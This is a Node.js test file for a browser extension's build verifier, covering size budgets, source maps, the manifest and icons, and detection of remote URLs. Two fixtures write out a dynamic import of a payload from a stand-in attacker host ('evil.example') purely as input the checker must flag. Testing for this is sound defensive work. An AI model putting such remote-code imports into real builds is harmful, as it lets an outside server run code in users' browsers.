import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { after, describe, it } from 'node:test'
import { assertBuild, findRemoteReferences, listFiles, sumBudgetedBytes } from './verify-build.mjs'

const tempRoots = []

after(() => {
  for (const root of tempRoots) {
    rmSync(root, { recursive: true, force: true })
  }
})

function createTempDir() {
  const root = mkdtempSync(path.join(tmpdir(), 'verify-build-'))
  tempRoots.push(root)
  return root
}

/** A minimal, otherwise-valid dist/ fixture: manifest + 4 icons + a tiny JS chunk. */
function createValidFixture(overrides = {}) {
  const dir = createTempDir()
  const manifest = overrides.manifest ?? {
    manifest_version: 3,
    name: 'Fixture',
    version: '0.0.1',
    icons: {
      16: 'icons/icon-16.png',
      32: 'icons/icon-32.png',
      48: 'icons/icon-48.png',
      128: 'icons/icon-128.png',
    },
  }

  writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(manifest))

  mkdirSync(path.join(dir, 'icons'), { recursive: true })
  for (const size of [16, 32, 48, 128]) {
    writeFileSync(path.join(dir, 'icons', `icon-${size}.png`), tinyPngBuffer())
  }

  mkdirSync(path.join(dir, 'assets'), { recursive: true })
  writeFileSync(
    path.join(dir, 'assets', 'index.js'),
    overrides.jsContent ?? 'console.log("fixture")',
  )
  writeFileSync(
    path.join(dir, 'index.html'),
    overrides.htmlContent ?? '<!doctype html><html></html>',
  )

  return dir
}

function tinyPngBuffer() {
  // A minimal PNG signature is enough -- assertBuild only checks the file
  // exists and its byte size, never decodes it as an image.
  return Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])
}

void describe('listFiles', () => {
  void it('recursively lists every file under a directory as relative, forward-slash paths', () => {
    const dir = createValidFixture()

    const files = listFiles(dir)

    assert.ok(files.includes('manifest.json'))
    assert.ok(files.includes('icons/icon-16.png'))
    assert.ok(files.includes('assets/index.js'))
    assert.ok(files.every((file) => !file.includes('\\')))
  })
})

void describe('sumBudgetedBytes', () => {
  void it('excludes dist/icons/*.png from the aggregate but counts everything else', () => {
    const dir = createValidFixture()
    const files = listFiles(dir)

    const total = sumBudgetedBytes(files, dir)

    const iconBytes = 4 * tinyPngBuffer().length
    const nonIconBytes = files.filter(
      (file) => !(file.startsWith('icons/') && file.endsWith('.png')),
    ).length
    assert.ok(total > 0)
    assert.ok(nonIconBytes > 0)
    // Sanity: the icon bytes alone must NOT be part of the counted total --
    // proven properly below via the dedicated budget-violation test, but this
    // guards the simple "some bytes counted" case too.
    assert.ok(total < iconBytes + 1_000_000)
  })
})

void describe('findRemoteReferences', () => {
  void it('flags an http:// literal in JS content', () => {
    const dir = createValidFixture({ jsContent: 'fetch("http://example.com/api")' })
    const files = listFiles(dir)

    const violations = findRemoteReferences(files, dir, [])

    assert.ok(violations.some((violation) => violation.literal.startsWith('http://example.com')))
  })

  void it('flags an https:// literal in CSS content', () => {
    const dir = createValidFixture()
    writeFileSync(
      path.join(dir, 'assets', 'index.css'),
      '@import url(https://cdn.example.net/font.css);',
    )
    const files = listFiles(dir)

    const violations = findRemoteReferences(files, dir, [])

    assert.ok(
      violations.some((violation) => violation.literal.startsWith('https://cdn.example.net')),
    )
  })

  void it('flags a protocol-relative Google Fonts style reference in HTML content', () => {
    const dir = createValidFixture({
      htmlContent: '<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Roboto">',
    })
    const files = listFiles(dir)

    const violations = findRemoteReferences(files, dir, [])

    assert.ok(violations.some((violation) => violation.literal.startsWith('//fonts.googleapis')))
  })

  void it('flags an analytics-style import', () => {
    const dir = createValidFixture({
      jsContent: 'import("https://www.googletagmanager.com/gtag/js")',
    })
    const files = listFiles(dir)

    const violations = findRemoteReferences(files, dir, [])

    assert.ok(violations.some((violation) => violation.kind === 'analytics-import'))
  })

  void it('flags a remote dynamic import() call', () => {
    const dir = createValidFixture({
      jsContent: 'const mod = import("https://evil.example/payload.js")',
    })
    const files = listFiles(dir)

    const violations = findRemoteReferences(files, dir, [])

    assert.ok(violations.some((violation) => violation.kind === 'remote-dynamic-import'))
  })

  void it('does not flag a literal present in the allowlist', () => {
    const dir = createValidFixture({
      jsContent: 'openUrl("https://github.com/JR0210/tab-toolkit")',
    })
    const files = listFiles(dir)

    const violations = findRemoteReferences(files, dir, [
      { literal: 'https://github.com/JR0210/tab-toolkit', reason: 'Settings help link' },
    ])

    assert.deepEqual(violations, [])
  })

  void it('reports file, literal, and line/context for each violation', () => {
    const dir = createValidFixture({ jsContent: 'a();\nfetch("http://example.com/api")' })
    const files = listFiles(dir)

    const [violation] = findRemoteReferences(files, dir, [])

    assert.equal(violation.file, 'assets/index.js')
    assert.equal(violation.literal, 'http://example.com/api')
    assert.equal(violation.line, 2)
    assert.match(violation.context, /http:\/\/example\.com\/api/)
  })
})

void describe('assertBuild', () => {
  void it('rejects a JS chunk over 300,000 bytes', () => {
    const dir = createValidFixture({ jsContent: 'a'.repeat(300_001) })

    assert.throws(() => assertBuild(dir), /300/)
  })

  void it('accepts a JS chunk of exactly 300,000 bytes', () => {
    const dir = createValidFixture({ jsContent: 'a'.repeat(300_000) })

    assert.doesNotThrow(() => assertBuild(dir))
  })

  void it('rejects an aggregate budgeted size over 750,000 bytes', () => {
    const dir = createValidFixture()
    // The fixture's own files are tiny, so pad with several sub-budget JS
    // chunks (each under the 300,000-byte per-chunk cap) that together push
    // the aggregate to exactly 750,001 bytes.
    const perFile = 250_000
    for (let index = 0; index < 3; index += 1) {
      writeFileSync(path.join(dir, 'assets', `chunk-${index}.js`), 'a'.repeat(perFile))
    }
    writeFileSync(path.join(dir, 'assets', 'remainder.js'), 'a'.repeat(1))

    assert.throws(() => assertBuild(dir), /750/)
  })

  void it('rejects a build containing any .map file', () => {
    const dir = createValidFixture()
    writeFileSync(path.join(dir, 'assets', 'index.js.map'), '{}')

    assert.throws(() => assertBuild(dir), /\.map/)
  })

  void it('rejects a build missing manifest.json', () => {
    const dir = createValidFixture()
    rmSync(path.join(dir, 'manifest.json'))

    assert.throws(() => assertBuild(dir), /manifest\.json/)
  })

  void it('rejects a build missing an icon PNG referenced by the manifest', () => {
    const dir = createValidFixture()
    rmSync(path.join(dir, 'icons', 'icon-128.png'))

    assert.throws(() => assertBuild(dir), /icon/)
  })

  void it('rejects a build with an unallowlisted http:// reference', () => {
    const dir = createValidFixture({ jsContent: 'fetch("http://example.com/api")' })

    assert.throws(() => assertBuild(dir), /remote/i)
  })

  void it('rejects a build with an unallowlisted https:// reference', () => {
    const dir = createValidFixture({ jsContent: 'fetch("https://example.com/api")' })

    assert.throws(() => assertBuild(dir), /remote/i)
  })

  void it('rejects a build with an unallowlisted //fonts. reference', () => {
    const dir = createValidFixture({
      htmlContent: '<link href="//fonts.googleapis.com/css">',
    })

    assert.throws(() => assertBuild(dir), /remote/i)
  })

  void it('rejects a build with an unallowlisted analytics-style import', () => {
    const dir = createValidFixture({ jsContent: 'import("https://sentry.io/embed.js")' })

    assert.throws(() => assertBuild(dir), /remote/i)
  })

  void it('rejects a build with an unallowlisted remote dynamic import() URL', () => {
    const dir = createValidFixture({ jsContent: 'import("https://evil.example/payload.js")' })

    assert.throws(() => assertBuild(dir), /remote/i)
  })

  void it('accepts an otherwise-valid build whose only remote-looking literal is allowlisted', () => {
    const dir = createValidFixture({
      jsContent: 'openUrl("https://github.com/JR0210/tab-toolkit")',
    })

    assert.doesNotThrow(() =>
      assertBuild(dir, {
        allowlist: [
          { literal: 'https://github.com/JR0210/tab-toolkit', reason: 'Settings help link' },
        ],
      }),
    )
  })

  void it('accepts a fully valid fixture build with no violations', () => {
    const dir = createValidFixture()

    assert.doesNotThrow(() => assertBuild(dir))
  })
})
